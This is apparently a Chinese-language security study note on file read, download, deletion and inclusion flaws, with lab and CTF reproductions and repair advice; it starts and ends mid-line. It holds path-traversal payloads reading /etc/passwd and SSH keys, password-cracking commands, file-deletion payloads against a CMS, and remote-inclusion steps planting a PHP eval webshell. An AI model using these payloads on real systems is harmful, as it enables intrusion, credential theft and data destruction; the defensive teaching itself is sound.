安全模式绕过?filename=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd\n6. Linux下的常见利用姿势\n6.1 用户目录下的敏感文件\n.bash_history .zsh_history.psql_history.mysql_history.profile .bashrc.gitconfig.viminfo任意文件读取/etc/passwd提取passwd第一列，即root等一系列用户名读history：../../root/.bash_history暴破所有用户的.bash_history：../../../home/§root§/.bash_history\n历史命令重点关注出现的密码、路径、配置文件路径、其他关联IP、日志文件、war包、备份文件路径等等，可进一步读取或利用。\nPS：如要下载文件，可能会导致过大文件下载失败，可以使用wget进行下载，比如catanlina.out日志文件、war包、备份文件等等。\n6.2 主机凭证文件\n私钥文件\n/root/.ssh/id_rsa  私钥/root/.ssh/authorized_keys  公钥存储文件/root/.ssh/id_rsa.keystore/root/.ssh/known_hosts //记录每个访问计算机用户的公钥\n私钥文件如果没有设定密码保护，便可直接获取到进行登录到服务器，或使用xshell等软件选择证书登录。\nssh -i id_rsa root@IP地址\n系统密码\n\n/etc/passwd\n\nroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologin......用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell\n可以看到哪些用户可以登录\n\n/etc/shadow\n\nroot:$1$v2wT9rQF$XSpGgoB93STC4EFSlgpjg1:14181:0:99999:7:::$id$salt$密文\nid代表的是使用不同的加密算法，不同的系统使用的算法也不尽相同。salt是加密的时候需要用到盐。最后就是密文。\n注意：如果密码字符串为*，表示系统用户不能被登入，为!表示用户名被禁用，如果密码字符串为空，表示没有密码。\n\n\n\n格式\n算法\n\n\n\n\n$1\nmd5\n\n\n$2a\nblowfish\n\n\n$2y\nblowfish\n\n\n$5\nsha-256\n\n\n$6\nsha-512\n\n\n\n\n在线查询\n\nhttps://www.cmd5.com/\n\n\njohn破解\nunshadow /etc/passwd /etc/shadow &gt; test_passwd\njohn --wordlist=字典路径 test_passw\n默认密码字典位于/usr/share/john/password.ls\n\n6.3 全路径\nmlocate.db数据库里存储了本地所有文件的配置信息\n/var/lib/mlocate/mlocate.db\n利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息\nlocate mlocate.db config把包含config的路径全输出出来\nlocate mlocate.db webapps\nlocate mlocate.db www\n获取到路径后可以进一步挖掘敏感信息和系统漏洞\n7. 程序源代码\n利用全路径或者其他地方获取到的路径读取一些关键的程序源码。\n读取WEB-INF/web.xml，进一步读取class文件，反编译得到源码。\n读取war包，反编译获取源码。\n8. 应用配置文件\n获取到网站的相关配置信息，包括站点配置、数据库配置等等，也可进一步获取到源码。\n\njava站点\n/WEB-INF/web.xml\n/WEB-INF/classes/applicationContext.xml\n/WEB-INF/classes/xxx/xxx/xxx.class\ncore.jar如果遇到Shiro站点，可以直接利用全路径找到core.jar，去下载core.jar，下载后反编译搜索Base64.decode直接找key，进而getshell。\ntomcat\n/usr/local/tomcat/conf/tomcat-users.xml\nnginx\n/www/nginx/conf/nginx.conf\n/etc/nginx/nginx.conf\n/usr/local/nginx/conf/nginx.conf\n/usr/local/etc/nginx/nginx.conf\napache\n/etc/httpd/conf/httpd.conf\n/etc/apache2/apache2.conf\n/etc/apache2/httpd.conf\nredis\n/etc/redis.conf\nssh\n/etc/ssh/sshd_config\n\n9. 应用日志文件\n利用日志文件获取网站后台地址、api接口、备份、等等敏感信息。\n\ntomcat\n可以先找到/tomcat/bin/catalina.sh，里边有log的配置路径\n/webapps/ROOT/logs/catalina.out\napache\n/var/log/apache2/access.log\n/var/log/apache2/error.log\n/var/log/httpd/access_log\n/etc/httpd/logs/access_log\n/etc/httpd/logs/error_log\n/etc/httpd/logs/error.log\nnginx\n/var/log/nginx/access.log\n/var/log/nginx/error.log\n/usr/local/var/log/nginx/access.log\n/usr/local/nginx/logs\n\n10. Windows下的利用姿势\n10.1 盲读取桌面文件\n有些时候，管理员会图方便，在桌面存储一些敏感的文件，我们可以直接对桌面的一些文件名进行fuzz，比如1.txt、2.txt、密码.txt、pass.txt等等，进一步扩大战果。\n5. 任意文件下载漏洞\n一些网站由于业务需求，往往需要提供文件下载功能，但若对用户下载的文件不做限制，则恶意用户就能够下载任意敏感文件，这就是文件下载漏洞。\n漏洞产生原因\n\n有读取文件的函数\n读物文件的路径用户可控，且没有经过校验，或者校验不严格\n输出文件内容\n一个正常的网站，存在一个下载文件的功能，同时还会从浏览器接收文件名字\n\n文件下载的两种方式\n1、直接下载：\n&lt;a href=”http://www.a.com/xxx.rar”&gt;下载&lt;/a&gt;\n2、增加header头\n&lt;?php    $filename = $_GET[&#x27;filename&#x27;];    echo &#x27;&lt;h1&gt;开始下载文件&lt;/h1&gt;&lt;br /&gt;&lt;br /&gt;&#x27;;    echo file_get_contents($filename);    header(&#x27;Content-Type: imgage/jpeg&#x27;);    header(&#x27;Content-Disposition: attachment; filename=&#x27;.$filename);    header(&#x27;Content-Lengh: &#x27;.filesize($filename));?&gt;\n\n利用思路\n\n下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置\n下载各种.log文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。\n下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器。\n\n尝试读取/root/.bash_history看自己是否具有root权限。\n如果没有，就只能利用../来回跳转读取一些.ssh下的配置信息文件。\n读取mysql下的.bash_history文件。来查看是否记录了一些可以利用的相关信息。然后逐个下载需要审计的代码文件，但是下载的时候变得很繁琐，只能尝试去猜解目录，然后下载一些中间件的记录日志进行分析。\n常见利用方式\njava+oracle环境\n可以先下载/WEB-INF/classes/applicationContext.xml  文件，这里面记载的是web服务器的相应配置，然后下载/WEB-INF/classes/xxx/xxx/aaa.class对文件进行反编译，然后搜索文件中的upload关键字看是否存在一些api接口，如果存在的话我们可以本地构造上传页面用api接口将我们的文件传输进服务器。\n也可以先下载网站的配置文件，在根目录/WEB-INF/Web.xml的(一般都有很多内容,有时含有数据库连接用户名和密码等关键信息)。\n具有root权限\n在linux中有这样一个命令 locate 是用来查找文件或目录的，它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db。这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次。\n当不知道路径是什么的情况下，这个可以说是一个非常好用的了，我们利用任意文件下载漏洞将mlocate.db文件下载下来，利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息。\nlocate 读取方法\nlocate mlocate.db admin\n可以将mlocate.db中包含admin内容全部输出来。\n\n利用这个文件可以获取到该服务器任何我们想要的内容并下载出来而不用一个一个去猜解目录，但是这个文件只有root用户才能读取。另一方面我们也可以利用linux内核的一个文件/proc/self/cmdline当前进程的cmdline参数，可以获取到路径信息。\n总的来说，任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。\n6. 任意文件读取与下载漏洞验证\n任意文件读取验证\n示例代码：\n&lt;?php$filename=$_GET[&#x27;f&#x27;];echo file_get_contents($filename);?&gt;\n测试：\nreadfile.php?f=../../../../../../etc/passwd\n\nreadfile.php?f=../index.txt\n\nfile://伪协议 ，读取文件内容\nreadfile.php?f=file:///etc/passwd\n\n任意文件下载验证\n示例代码：\n&lt;?php$filename = $_GET[&#x27;f&#x27;];echo &#x27;&lt;h1&gt;讲开始下载文件！&lt;/h1&gt;&lt;br /&gt;&lt;br /&gt;&#x27;;echo file_get_contents($filename);header(&#x27;Content-Type: imgage/jpeg&#x27;);header(&#x27;Content-Disposition: attachment; filename=&#x27;.$filename);header(&#x27;Content-Lengh: &#x27;.filesize($filename));?&gt;\n\n当然，我下载的这个文件并没有内容。\n7. 漏洞判断\n参数f的参数值为PHP文件时：\n\n1.文件被解析，则是文件包含漏洞\n2.显示源代码，则是文件读取漏洞\n3.提示下载，则是文件下载漏洞\n\n8. 漏洞利用实战\n我学习任意文件读取与下载漏洞，就是因为遇到了一个任意文件读取与下载漏洞的Web题，所以在此实战一下\nRoarCTF2019-Web：Easy Java(跟着复现吧)\n\n不是弱口令，也不能扫出目录。只有一个help.docx文件可以下载。于是可能是任意文件下载漏洞。\n点击蓝字“help”，抓包，发包。发现GET方式一直什么都下载不了。后来修改为POST，就可以下载了。\n此时url：download，猜测是文件下载漏洞, 如下图发现filename参数可控\n\n\n没啥用, 补充一下java web的目录结构\n\n敏感目录（1） /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。（2） /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中（3） /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件（4） /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。（5）/WEB-INF/database.properties：数据库配置文件\nWEB-INF/web.xml泄露\n漏洞成因：通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。\n漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。\nPOST访问WEB-INF/web.xml, 发现\n\n没错, 搞心态的\n参照之前，想尝试访问/WEB-INF/web.xml得到文件但是失败了，查看源码发现有个地方是要求POST方式传入\n\n\n\n发现如下\n\n发现操作flag的关键文件位置，读取(或下载)/WEB-INF/classes/下的flag的关键文件位置，又因为Java字节码类文件（.class）是Java编译器编译Java源文件（.java）产生的“目标文件”。\n最终得出flag的关键文件位置为：/WEB-INF/classes/com/wm/ctf/FlagController.class\n\nbase64解码即可\n9. 漏洞防御修复\n通用\n\n过滤 . 点，使用户在url中不能回溯上级目录\n正则严格判断用户输入的参数\nphp.ini配置open_basedir限定文件访问范围\n\n文件下载漏洞修复\n\n将下载区独立出来，放在项目路径外，给每个下载资源固定的URL，而不是所有的下载资源都是统一的URL：www.test.com/download?filename=文件名\n净化数据：对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。\nweb应用程序可以使用chroot环境包含被访问的web目录，或者使用绝对路径+参数来访问文件目录时, 使其即使越权也在访问目录之内。www目录就是一个chroot应用。由chroot创造出的那个根目录，叫做“chroot监狱”(所谓”监狱”就是指通过chroot机制来更改某个进程所能看到的根目录，即将某进程限制在指定目录中，保证该进程只能对该目录及其子目录的文件有所动作，从而保证整个服务器的安全。\n详细具体chroot的用法，可参考：blog.csdn.net/frozen_fish/article/details/2244870\n任意文件下载漏洞也有可能是web所采用的中间件的版本低而导致问题的产生，例如ibm的websphere的任意文件下载漏洞，需更新其中间件的版本可修复。\n要下载的文件地址保存至数据库中。\n文件路径保存至数据库，让用户提交文件对应ID下载文件。\n用户下载文件之前需要进行权限判断。\n文件放在web无法直接访问的目录下。\n不允许提供目录遍历服务。\n公开文件可放置在web应用程序下载目录中通过链接进行下载。\n记录文件下载日志。\n\n0x03 文件删除\n1.1 漏洞描述\n​\t\t应用程序在删除文件前，未对所要删除的文件内容、类型、文件名、文件目录做合法性校验，导致可删除服务器上任意文件，比如删除安装目录中锁文件，直接进行重装应用系统。\n​\t\t攻击者从寻找上删除的功能，正常删除功能的文件没有经过校验或者不严格，攻击者控制这个可操作的变量配合目录遍历进行删除其他文件。这里涉及到一个unlink()函数，这个函数的作用是删除对应的文件及文件内容。\n1.2 应用场景\n删除文件、附件、图片、替换、配置等\n1.3 漏洞危害\n攻击者利用此漏洞可直接删除web目录甚至服务器上任意格式文件，直接导致业务系统中断、崩溃。\n1.4 漏洞实例(不知为何, 这种漏洞的文章太少了, 先跟着复现吧)\n1.4.1 环境搭建(看了半天才发现, 现在的漏洞已经被修复了…)\n因此我借鉴之前有漏洞的情况, 把关键代码写上去吧\nCSCMS ：http://www.chshcms.com\n网站源码版本：Cscms_v4.1正式版（发布日期：2017-06-05）\n程序源码下载：https://github.com/chshcms/cscms\n漏洞实例一\n漏洞文件位置：\\cscms\\plugins\\sys\\admin\\Basedb.php  第160-177行：\n//备份删除\tpublic function del()&#123;\t\t$dir = str_replace(&quot;//&quot;,&quot;/&quot;,str_replace(&quot;..&quot;,&quot;&quot;,$this-&gt;input-&gt;get_post(&#x27;id&#x27;,true)));        //修复前        //$dir = $this-&gt;input-&gt;get_post(&#x27;id&#x27;, true);\t\tif(empty($dir))&#123;\t\t\tgetjson(L(&#x27;plub_11&#x27;));\t\t&#125;\t\t$dirs = array();\t\tif(!is_array($dir))&#123;\t\t\t$dirs[] = $dir;\t\t&#125;else&#123;\t\t\t$dirs = $dir;\t\t&#125;\t\tforeach($dirs as $dir) &#123;            deldir(FCPATH.&#x27;attachment/backup/&#x27;.$dir);\t\t&#125;\t\t$info[&#x27;msg&#x27;] = L(&#x27;plub_12&#x27;);\t\t$info[&#x27;url&#x27;] = site_url(&#x27;basedb/restore&#x27;).&#x27;?v=&#x27;.rand(1000,9999);        getjson($info,0);\t&#125;\n漏洞利用：\n1、根目录下新建test目录作为测试：\n\n2、构造参数成功删除test目录(环境看不懂咋搭建, 就算了吧)\nhttp://127.0.0.1/admin.php/basedb/delPOST:id=..\\\\..\\\\test\n\n漏洞实例二\n漏洞文件位置：/plugins/sys/admin/Skin.php 第418–440行：\n//文件删除\tpublic function del()&#123;        $ac = $this-&gt;input-&gt;get(&#x27;ac&#x27;,true);        $op = $this-&gt;input-&gt;get(&#x27;op&#x27;,true);        $dir = str_replace(&quot;.&quot;,&quot;&quot;,$this-&gt;input-&gt;get(&#x27;dirs&#x27;,true));        $file = str_replace(&quot;..&quot;,&quot;&quot;,$this-&gt;input-&gt;get(&#x27;file&#x27;));        //修复前        //$dir = $this-&gt;input-&gt;get(&#x27;dirs&#x27;,true);        //$file = $this-&gt;input-&gt;get(&#x27;file&#x27;);\t\tif($ac!=&#x27;mobile&#x27;) $ac=&#x27;pc&#x27;;\t\tif($op!=&#x27;home&#x27; &amp;&amp; $op!=&#x27;user&#x27;) $op=&#x27;skins&#x27;;\t\tif(empty($dir) || preg_match(&quot;/^[\\/]&#123;1,&#125;$/i&quot;,$dir)) getjson(L(&#x27;plub_27&#x27;));        $skin_dir = VIEWPATH.$ac.FGF.$op.FGF.$dir.FGF.$file;\t\tif (!is_dir($skin_dir)) &#123;  //文件              $res=unlink($skin_dir);\t\t&#125;else&#123;  //目录              $res=deldir($skin_dir);\t\t&#125;\t\tif($res)&#123;            $info[&#x27;url&#x27;] = site_url(&#x27;skin&#x27;).&#x27;?ac=&#x27;.$ac.&#x27;&amp;op=&#x27;.$op.&#x27;&amp;v=&#x27;.rand(1000,9999);            $info[&#x27;msg&#x27;] = L(&#x27;plub_46&#x27;);            $info[&#x27;turn&#x27;] = 1;            getjson($info,0);\t\t&#125;else&#123;            getjson(L(&#x27;plub_28&#x27;));\t\t&#125;\t&#125;\n漏洞利用：\n网站根目录下新建1.txt文件作为测试，构造URL成功删除文件Payload：http://127.0.0.1/admin.php/skin/del?ac=pc&amp;op=skins&amp;dirs=default&amp;file=..\\\\..\\\\..\\\\..\\\\1.txt\n漏洞实例三\n漏洞文件位置：/plugins/sys/admin/Plugins.php 第285-299行：\n//删除\tpublic function del()&#123;\t    $dir = $this-&gt;input-&gt;get_post(&#x27;dir&#x27;,true);\t    if($dir==&#x27;&#x27;)&#123;\t    \tgetjson(L(&#x27;plub_del_0&#x27;),1);\t    &#125;        deldir(FCPATH.&#x27;plugins&#x27;.FGF.$dir.FGF);\t\t//删除配置目录        deldir(CSCMS.$dir.FGF);\t\t//删除模板目录        deldir(FCPATH.&#x27;tpl/admin/&#x27;.$dir.FGF);        $info[&#x27;func&#x27;] = __FUNCTION__;        $info[&#x27;msg&#x27;] = L(&#x27;plub_del_1&#x27;);        getjson($info,0);\t&#125;\n漏洞利用:\n?dir=…\\test;\n\n自己搭建一个\n&lt;?php    header(&quot;Content-Type:text/html;charset=utf-8&quot;);    $filename = $_GET[&#x27;file&#x27;];    if(file_exists($filename))&#123;        unlink($filename);        echo &quot;&lt;script&gt;alert(&#x27;删除成功&#x27;)&lt;/script&gt;&quot;;    &#125;else&#123;        echo &quot;&lt;script&gt;alert(&#x27;删除失败&#x27;)&lt;/script&gt;&quot;;    &#125;\n\n执行查询后，文件被删除成功了, 目录中没了, 当然也可以遍历目录删除\n\n1.5 修复建议\n限制文件删除函数可删除的目录位置、文件类型\n文件名非用户可控\n0x04 文件包含\n为何要进行文件包含？\n​\t\t程序员写程序的时候，不喜欢干同样的事情，也不喜欢把同样的代码（比如一些公用的函数）写几次，于是就把需要公用的代码写在一个单独的文件里面，比如 share.php，而后在其它文件需要使用时进行包含调用。在php里，我们就是使用上面列举的那几个函数来达到这个目的的，它的工作流程：如果你想在 main.php里包含share.php,我将这样写 include(“share.php”) ，然后就可以使用share.php中的函数了\n文件包含漏洞汇总: 文件包含\n常见的文件包含函数:PHP：include() 、include_once()、require()、require_once()JSP/Servlet：ava.io.file()、java.io.filereader()ASP：include file、include virtual\n文件包含各个脚本代码 ASP,PHP,JSP,ASPX等&lt;! --#include file=“1.asp” --&gt;&lt;c:import url=“http://thief.one/1.jsp”&gt;&lt;jsp:include page=“head.jsp”/&gt;&lt;%@ include file=“head.jsp”%&gt; &lt;?php Include(&#x27;test.php&#x27;)?&gt;\n​\t\t黑盒测试（Black-box testing）是一种软件测试方法，其中测试人员在测试过程中只关注输入和输出，而对被测试系统的内部结构和实现细节不了解。测试人员将软件系统视为一个&quot;黑盒子&quot;，只能观察和测试其功能和行为，而不了解其内部工作原理。\n​\t\t简单来说, 应该跟白名单一样, 当你输入的参数是正确的或者是系统认可的, 那你就可以成功输入\n1.1文件包含漏洞的原理\n​\t\t文件包含漏洞是一种常见的web类型漏洞,因为很多脚本语言支持使用文件包含,也就是我们所说的文件包含函数，网站开发者经常会把一些代码插入到指定的地方,从而节省时间避免再次编写 ,这就是包含函数的基础解释  ,但是我们不光可以包含我们预先指定的文件，也可以包含我们服务器内部的其他文件，前提条件就是我们需要有可读的权限才能读取这些文件  ,所以这样就会导致文件包含漏洞\n1.2文件包含漏洞产生的原因\n​\t\t在网站的开发人员在开发网站的时候，会把经常重复使用的函数或者特定的页面写到单个文件中，需要使用的时候就直接调用此文件即可，而无需再次浪费时间再次编写，这种操作通常被称为文件包含。\n​\t\t如果我们没有对文件的来源进行严格的审查，也就是程序员在编写代码的时候触犯的逻辑性的错误就可能会导致文件读取漏洞和其它类型的漏洞，我们已php为例，在php中常用的文件包含函数有（include、require、include_once、require_once）,后续会介绍其中的区别。\n1.2.1 无限制&amp;有限制的包含\n无限制为直接直接包含文件：\n&lt;?php$filename=$_GET[&#x27;filename&#x27;];include($filename);?&gt;\n有限制为直接直接包含文件：以添加固定后缀为例\n&lt;?php$filename=$_GET[&#x27;filename&#x27;];include($filename.&quot;.html&quot;);?&gt;\n1.3漏洞的形成需要的条件\n1、`include()`等函数通过`动态变量的方式`引入需要包含的文件；2、`用户能够控制`这个动态变量；注：一般来说服务端通过`GET`和`POST`两种请求方式来传递需要包含的文件的话就是用户可控的。\n1.3文件包含漏洞实例\n​\t\tApace  solr是apache公司研发的一款开源的搜索服务,应用范围很广,而且应用的人群也是很广的，但是在近几年它被爆出存在任意文件读取的漏洞，攻击者可以通过构造指定的payload对服务器内部文件进行读取的操作，这就造成很大的危害，因为我们可以通过读取敏感的数据从而控制服务器。\n1.4文件包含漏洞分类\n​\t\t其文件包含漏洞共分为两大类，本地文件包含和远程文件包含，但是如果想要实现远程文件包含，需要php.ini开启了allow_url_fopen和allow_url_include的配置。包含的文件是第三方服务器的文件。本地文件包含的含义就是包含本地服务器的文件\n1.4.1 本地包含\n原理：\n本地文件包含（Local File Include，LFI），能够读取或执行包含本地文件的漏洞，称为本地文件包含漏洞。  LFI允许攻击者通过浏览器包含本机上的文件。当一个WEB应用程序在没有正确过滤输入数据的情况下，就有可能存在这个漏洞，该漏洞允许攻击者操纵输入数据、注入路径遍历字符、包含web服务器的其他文件。\n无限制：可直接包含http://127.0.0.1:8888/webinclude.php?filename=phpinfo.txt\n有限制：即漏洞使用有干扰，则需要特殊方法绕过\n%00 截断：条件：magic_quotes_gpc = off php版本&lt;5.3.4长度截断：条件：区分操作系统：windows点号需要长于256；linux长于4096\n1.4.2 远程包含\n无限制：直接包含：http://192.168.114.11/webinclude.php?filename=http://www.xiaodi8.com/readme.txt\n限制强制添加.html 可以用以上的符号 ? 、%23（#注释符） 、%20（空格）（不可用）\n注意：\n为什么文件包含一般使用txt格式的文件？\n 1、文件包含是无视文件格式的，只要文件中含有php代码，它就会把这个文件解析为1php脚本文件； 2、当靶机对我们远端服务器的php脚本远程文件包含时，由于我们远端服务器可以解析php脚本，这样的话，我们远端服务器首先会对这个php脚本进行解析执行，远端服务器解析完成后，直接把解析后的结果返回给靶机服务器，由于是在我们远端服务器里面进行解析执行的，所以返回的结果就是我们远端服务器的执行结果。  当我们使用txt格式或者其他非php格式进行文件包含时，由于我们远端服务器没有对文件进行包含，不会在我们远端服务器进行解析；当靶机对我们远端服务器的这个txt文件进行远程文件包含时，靶机对 txt文件进行读取时，这就相当于靶机服务器通过远程文件包含把我们远端服务器的txt文件拿到靶机上面了，靶机发现里面有php代码，这个时候，靶机就会按照php脚本对它进行解析；由于是在靶机里面读取的，所以执行的结果就是靶机的。  远程文件包含需要包含我们服务器上的文件或者公网上的文件。\n1.4.3 本地文件包含代码测试-原理\n本地准备 phpinfo的txt文件\nhttp://127.0.0.1:8888/webinclude.php?filename=phpinfo.txt 大多代码语言文件包含中可添加路径以读取其他路径下文件：`../../`，`d:\\`等\n有限制时：以添加 .html后缀为例\n\n1.4.4 远程文件包含代码测试-原理\n对于远程包含，若php环境禁止，即没有远程包含功能\n\n无限制时直接包含：(可以使用?和#进行伪截断，该方法对PHP版本没要求，但是要求能够包含远程文件。)\n\n以添加 .html后缀为例的限制级：\n\n1.4.5 远程文件包含代码测试-原理\n1、查看远端服务器的ip和phpinfo();信息:\nip：185.243.241.45\nphpinfo()信息:php版本为5.6.40\n2、查看靶机的ip和phpinfo();信息:\nip：127.0.0.1\nphpinfo()信息:php版本为7.3.4\n3、在远端服务器网站主目录下，创建两个文件，一个是1.php，一个是1.txt:\n内容:\n&lt;?php phpinfo();?&gt;\n\n4、在靶机上面对远端服务器的1.php文件进行文件包含，可以看出，解析的结果为远端服务器的phpinfo();信息，如果使用一句话木马的话，获得的webshell也是自己的远端服务器的：\n注:这里之所以返回的是我们的远端服务器的phpinfo();信息，是因为phpinfo();脚本在我们的远端服务器上面被执行了，执行完成后，通过文件包含返回了远端服务器的执行结果。也就是说这个执行结果不是靶机网站的而是我们自己的远端服务器的执行结果。\n\n5、在靶机上面远程包含我们远端服务器网站主目录下的1.txt文件，可以看出，可以看出解析的结果为靶机的phpinfo();信息：\n注:当我们使用txt格式或者其他非php格式进行文件包含时，由于我们远端服务器没有对文件进行包含，不会在我们远端服务器进行解析；所以当靶机对我们远端服务器的这个1.txt文件进行远程文件包含时，远端服务器不对它做解析，靶机对1.txt进行读取时，发现里面有php代码，这个时候，靶机就会按照php脚本对它进行解析；由于是在靶机里面读取的，所以执行的结果就是靶机的。\n1.4.6 包含大马文件：\n1、复制一个大马文件dama.php到主机的网站主目录下，并修改后缀名为txt格式：\n2、直接访问这个文件，发现服务器是以文本文件的方式打开：\n\n3、对这个文件进行远程文件包含，发现dama.txt格式的文件被以php脚本的形式解析了：\n这里不知道为啥我显示的页面不对劲，下面展示一个正常的\n\n\n1.4.6 写入文件脚本方式，写入一句话木马\n1、在虚拟机网站主目录下面创建一个3.txt的文件,通过这个文件向服务器里面写入一句话木马yih.php文件：\n内容：\n&lt;?php   $file=fopen(&#x27;yjh.php&#x27;,&#x27;w&#x27;);  fputs($file,&#x27;&lt;?php @eval($_REQUEST[666]);?&gt;&#x27;);?&gt;\n3、使用远程文件进行包含这个文件，并查看文件包含目录下，已经创建了一个yjh.php的文件：\n\n4、使用蚁剑进行连接，成功获得webshell（这里注意添加yjh.php的路径法）\n\n注意:  有时候，我们无法通过传入参数进行访问phpinfo页面，可能是DVWA的环境问题；还有就算我们能够连接到这个文件，但是菜刀连接不上，这个时候我们可以创建一个写入文件的脚本文件，通过访问这个脚本文件，在目标服务器里面创建一个一句话木马的方式进行连接。\n1.5漏洞的攻击步骤\n我们将从php语言的角度来看一下文件包含漏洞，以及相关的攻击步骤\n在php语言当中，有四种文件包含的函数，分别是include、require、include_once、require_once\nInclude：被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照 include_path指定的目录寻找。如果在 include_path下没找到该文件则 include 最后才在调用脚本文件所在的目录和当前工作目录下寻找。如果最后仍未找到文件则 include 结构会发出一条警告；\nps：php开启错误题型需要配置php.ini中disaply_errors为On\nRequire：require 和 include几乎完全一样，除了处理失败的方式不同之外。require 在出错时产生 E_COMPILE_ERROR 级别的错误。换句话说将导致脚本中止而 include只产生警告（E_WARNING），脚本会继续运行。\nInclude_once：include_once 语句在脚本执行期间包含并运行指定文件。此行为和 include语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含，且 include_once 会返回 true。 如同此语句名字暗示的那样，该文件只会包含一次。 include_once  可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题。\nRequire_once：require_once 语句和 require语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。\n我们来总结下，include函数在执行文件时候每次都要进行读取和评估，在找不到文件的情况下会发出一条警告，且还会继续运行，require则会给出一条致命错误，从而停止运行，include_once和require_once和include和require类似，但他们仅仅只包含一次。\n1.5.1 判断服务器类型\n​\t 其实判断服务器类型还是很好判断的, 在linux系统当存在1.php的时候读取就是cat 1.php，而且读取的内容假如是：“I Love You”，若是读取1.Php那么还能够显示&quot;I Love You&quot;吗？结果肯定是不行的，由于在linux中是严格区分大小写的。而在windows中是不区分大小写的，这里就可以使用windows进行测试。\n通过上面的图片能够看出来，我在URL中读取的是1.phP，但文件夹中只有1.php，但依旧显示PHP的默认文件。这就验证了我上面提到的Windows是不区分大小写的。\n1.5.2 敏感文件读取\n所谓读取敏感文件，就是将WEB服务器上一些其他文件读取出来，这些其他文件中可能包含一些敏感文件，私密文件或者是一些数据、表格等。\n1.5.3 绝对路径读取\n绝对路径是指目录下的绝对位置，直接到达目标位置，通常是从盘符开始的路径，绝对路径读取就是通过明确的路径进行读取文件，比如windows或者linxu中的一些日志文件存在的路径，或者一些配置文件存放的路径。\nwindows敏感文件的绝对路径C:\\boot.ini                       #查看系统版本C:\\windows\\system32\\inetsrv\\MetaBase.xml      #IIS配置文件C:\\windows\\repair\\sam          #存储Windows的密码C:\\programFiles\\mysql\\my.ini     #mysql配置文件，里面可能有密码C:\\programFiles\\mysql\\data\\mysql\\user.MYD      #mysql root密码C:\\windows\\php.ini             #php配置文件linux敏感文件的绝对路径/etc/passwd                      #用户密码/usr/local/app/apache2/conf/httpd.conf         #apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhosts.conf   #虚拟网站设置/usr/local/app/php5/lib/php.ini       #php相关设置        /etc/httpd/conf/httpd.conf           #apache配置文件        /etc/my.cnf                       #mysql配置文件/etc/sysconfig/iptables              #查看防火墙策略\n绝对路径读取案例\n通过URL看到我这里是直接读取我C:\\tool\\PHPTutorial\\1.txt的文件。\n\n1.5.4 相对路径读取\n相对路径就是指由这个文件所在的路径引起的跟其它文件（或文件夹）的路径关系。相对路径读取就是当我们不知道某个文件具体路径的时候，使用相对路径以当前位置作为参看向后退，逐次访问。\n相对路径读取方式相对利用读取方式就需要使用&quot;…/“来进行读取，一次”../“向后退一次。例如：当我们在C:\\tool\\PHPTutorial\\www的时候，那么我们使用”…/“的时候我们就退到C:\\tool\\PHPTutorial，若使用两次”…/“的时候就会退到C:\\tool，两次”../“也就是”../../&quot;就可以了。\neg__1:\n这里我把1.txt创建在C:\\tool\\PHPTutorial目录下，而现在这个文件包含漏洞放在www下也就是C:\\tool\\PHPTutorial\\www，所以这里我只需要输入一次&quot;…/&quot;就可以读取到1.txt了。\neg__2:\n这里我们思考一下若我们要访问C:\\windows\\win.ini，该怎么读取呢？其实这里可以先退到根目录下也就是C盘下，然后在访问windows中的win.ini。\n  目前我们在C:\\tool\\PHPTutorial\\www下面，那么可以算一下我们要退几次？这里通过目录也能够看出来，这里只需要退三次就可以到C盘下了。\n  这里由于无法在C盘中创建文件，就无法演示了，那么这里我们直接读取C:\\windows\\win.ini吧。\neg__3:\n这里又出现一个问题，若我们并不知道我们存在那个目录下，更不知道该退几级怎么办？其实这里通过&quot;…/“退可以多退几次，因为最终只能够退到C盘，所以在不知道几级的情况下，可以多输入几个”…/“。\n  可以看我下面的图片，我原本只需要退三次就可以了，而我这里退八次依旧能读取到，所以就能证明刚刚我所解释的，不管输入多少个”…/&quot;最终只会退到C盘。\n1.5.5 远程文件读取\n远程文件包含大概意思在之前已经提过了，这里就演示一下案例。\n前提条件：目标服务器的allow_url_fopen选项是on。只有当这个选项是on的时候就能够使用远程文件包含一句话木马。\n这里用别人的演示\n远程文件配合一句话木马案例\n网站服务器：192.168.10.150\n  攻击者主机：192.168.10.50\n攻击者php代码：\n&lt;?php fputs(fopen(&quot;shell.php&quot;, &quot;w&quot;),&quot;&lt;?php 